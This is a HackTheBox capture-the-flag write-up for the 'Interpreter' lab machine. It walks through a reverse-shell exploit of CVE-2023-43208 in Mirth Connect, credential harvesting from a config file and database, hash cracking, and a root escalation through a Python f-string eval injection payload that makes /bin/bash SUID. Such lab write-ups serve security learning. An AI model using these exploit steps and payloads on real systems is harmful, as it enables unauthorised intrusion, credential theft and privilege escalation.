---
title: Interpreter - HTB
date: 2026-02-21
categories: [WriteUps, HTB]
tags: [HTB, linux, web, privesc, PBKDF2]
image:
  base: /assets/img/posts/htb/interpreter
active: false
difficulty: medium
os: linux
description: "Interpreter is the 4th machine of HackTheBox Season 10."
pawned: root
---

## Scan

```bash
sudo nmap -n -sS -Pn -p- -oN scan.txt 10.129.3.65
# 22/tcp   open  ssh
# 80/tcp   open  http
# 443/tcp  open  https
# 6661/tcp open  unknown
```

---

## Foothold

Port 443 runs **Mirth Connect**. Check the version:

```bash
curl -sk https://interpreter.htb/api/server/version -H "X-Requested-With: XMLHttpRequest"
# 4.4.0
```

Mirth Connect < 4.4.1 is vulnerable to [CVE-2023-43208](https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc) - an unauthenticated Java deserialization RCE via Commons Collections.

```bash
rlwrap nc -nlvp 4444 -s 10.10.16.48

python3 CVE-2023-43208.py -lh 10.10.16.48 -lp 4444 -u https://interpreter.htb
```

```bash
whoami
# mirth
```

---

## User

### DB Credentials in Config

```bash
cat /usr/local/mirthconnect/conf/mirth.properties
# database.username = mirthdb
# database.password = MirthPass123!
```

### Dump Users from MariaDB

```bash
mysql -u mirthdb -p'MirthPass123!' -h localhost mc_bdd_prod
```

```sql
SELECT USERNAME FROM PERSON;
-- sedric

SELECT PASSWORD FROM PERSON_PASSWORD WHERE PERSON_ID = 2;
-- u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

### Crack PBKDF2-HMAC-SHA256 Hash

Mirth Connect stores passwords as PBKDF2-HMAC-SHA256 (600000 iterations). The base64 value from the DB encodes `salt (16 bytes) + hash (32 bytes)`. Split and reformat for hashcat mode 10900:

```
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
# sha256:600000:...:snowflake1
```

```bash
ssh sedric@interpreter.htb
# Password: snowflake1
```

---

## Root

### Privileged Process Discovery

```bash
ps aux | grep python
# root  /usr/bin/python3 /usr/local/bin/notif.py
```

### f-string Eval Injection in notif.py

The script runs as root and listens on `127.0.0.1:54321`. It receives patient XML, validates each field against a regex, then builds and evaluates an f-string:

```python
{% raw %}
template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old..."
return eval(f"f'''{template}'''")
{% endraw %}
```

The `gender` field passes the regex `^[a-zA-Z0-9._'"(){}=+/]+$` which allows `{`, `}`, `"`, `(`, `)` - enough to embed an arbitrary Python expression. Injecting `{__import__("os").system("/tmp/rev.sh")}` executes code as root.

**Step 1 - Prepare payload:**

```bash
echo "chmod 4755 /bin/bash" > /tmp/rev.sh
chmod 755 /tmp/rev.sh
```

**Step 2 - Trigger the injection** (`curl` is not available, use `wget`):

```bash
wget -q -O- \
  --post-data='<patient>
    <firstname>test</firstname>
    <lastname>test</lastname>
    <sender_app>test</sender_app>
    <timestamp>test</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>{__import__("os").system("/tmp/rev.sh")}</gender>
  </patient>' \
  --header='Content-Type: application/xml' \
  http://127.0.0.1:54321/addPatient
```

**Step 3 - Get root shell:**

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1265648 ... /bin/bash

/bin/bash -p
bash-5.2# id
uid=0(root) gid=0(root) groups=0(root)

bash-5.2# cat /root/root.txt
```